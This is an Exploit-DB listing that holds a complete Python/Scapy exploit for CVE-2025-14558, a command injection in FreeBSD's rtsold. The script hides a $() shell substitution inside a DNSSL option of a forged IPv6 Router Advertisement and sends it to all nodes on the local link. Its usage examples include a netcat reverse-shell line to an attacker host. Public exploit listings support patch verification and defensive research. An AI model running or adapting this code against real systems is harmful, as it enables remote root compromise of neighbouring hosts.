---
title: [webapps] FreeBSD rtsold 15.x - Remote Code Execution via DNSSL
url: https://www.exploit-db.com/exploits/52463
source: Exploit-DB.com RSS Feed
date: 2025-12-25
fetch_date: 2025-12-26T03:22:52.562684
---

# [webapps] FreeBSD rtsold 15.x - Remote Code Execution via DNSSL

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# FreeBSD rtsold 15.x - Remote Code Execution via DNSSL

#### EDB-ID:

###### 52463

#### CVE:

###### [2025-14558](https://nvd.nist.gov/vuln/detail/CVE-2025-14558)

---

**EDB Verified:**

#### Author:

###### [Lukas Johannes Möller](/?author=12321)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-12-25

---

**Vulnerable App:**

```
# Exploit Title: FreeBSD rtsold 15.x - Remote Code Execution via DNSSL
# Date: 2025-12-16
# Exploit Author: Lukas Johannes Möller
# Vendor Homepage: https://www.freebsd.org/
# Version: FreeBSD 13.x, 14.x, 15.x (before 2025-12-16 patches)
# Tested on: FreeBSD 14.1-RELEASE
# CVE: CVE-2025-14558
#
# Description:
#   rtsold(8) processes IPv6 Router Advertisement DNSSL options without
#   validating domain names for shell metacharacters. The decoded domains
#   are passed to resolvconf(8), a shell script that uses unquoted variable
#   expansion, enabling command injection via $() substitution.
#
# Requirements:
#   - Layer 2 adjacency to target
#   - Target running rtsold with ACCEPT_RTADV enabled
#   - Root privileges (raw socket for sending RA)
#   - Python 3 + Scapy
#
# References:
#   https://security.FreeBSD.org/advisories/FreeBSD-SA-25:12.rtsold.asc
#   https://github.com/JohannesLks/CVE-2025-14558

import argparse
import struct
import sys
import time

try:
    from scapy.all import (
        Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
        ICMPv6NDOptSrcLLAddr, Raw, get_if_hwaddr, sendp
    )
except ImportError:
    sys.exit("[!] Scapy required: pip install scapy")

def encode_domain(name):
    """Encode domain in DNS wire format (RFC 1035)."""
    result = b""
    for label in name.split("."):
        if label:
            data = label.encode()
            result += bytes([len(data)]) + data
    return result + b"\x00"

def encode_payload(cmd):
    """Encode payload as DNS label with $() wrapper for command substitution."""
    payload = f"$({cmd})".encode()
    if len(payload) > 63:
        # Split long payloads across labels (dots inserted on decode)
        result = b""
        while payload:
            chunk = payload[:63]
            payload = payload[63:]
            result += bytes([len(chunk)]) + chunk
        return result + b"\x00"
    return bytes([len(payload)]) + payload + b"\x00"

def build_dnssl(cmd, lifetime=0xFFFFFFFF):
    """Build DNSSL option (RFC 6106) with injected command."""
    data = encode_domain("x.local") + encode_payload(cmd)

    # Pad to 8-byte boundary
    pad = (8 - (len(data) + 8) % 8) % 8
    data += b"\x00" * pad

    # Type=31 (DNSSL), Length in 8-octet units
    length = (8 + len(data)) // 8
    return struct.pack(">BBH", 31, length, 0) + struct.pack(">I", lifetime) + data

def build_ra(mac, payload):
    """Build Router Advertisement with malicious DNSSL."""
    return (
        Ether(src=mac, dst="33:33:00:00:00:01")
        / IPv6(src="fe80::1", dst="ff02::1", hlim=255)
        / ICMPv6ND_RA(chlim=64, M=0, O=1, routerlifetime=1800)
        / ICMPv6NDOptSrcLLAddr(lladdr=mac)
        / ICMPv6NDOptPrefixInfo(
            prefixlen=64, L=1, A=1,
            validlifetime=2592000, preferredlifetime=604800,
            prefix="2001:db8::"
        )
        / Raw(load=build_dnssl(payload))
    )

def main():
    p = argparse.ArgumentParser(
        description="CVE-2025-14558 - FreeBSD rtsold DNSSL Command Injection",
        epilog="Examples:\n"
               "  %(prog)s -i eth0\n"
               "  %(prog)s -i eth0 -p 'id>/tmp/pwned'\n"
               "  %(prog)s -i eth0 -p 'nc LHOST 4444 -e /bin/sh'",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument("-i", "--interface", required=True, help="Network interface")
    p.add_argument("-p", "--payload", default="touch /tmp/pwned", help="Command to execute")
    p.add_argument("-c", "--count", type=int, default=3, help="Packets to send (default: 3)")
    args = p.parse_args()

    try:
        mac = get_if_hwaddr(args.interface)
    except Exception as e:
        sys.exit(f"[!] Interface error: {e}")

    print(f"[*] Interface: {args.interface} ({mac})")
    print(f"[*] Payload: {args.payload}")

    pkt = build_ra(mac, args.payload)

    for i in range(args.count):
        sendp(pkt, iface=args.interface, verbose=False)
        print(f"[+] Sent RA {i+1}/{args.count}")
        if i < args.count - 1:
            time.sleep(1)

    print("[+] Done")

if __name__ == "__main__":
    main()
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/...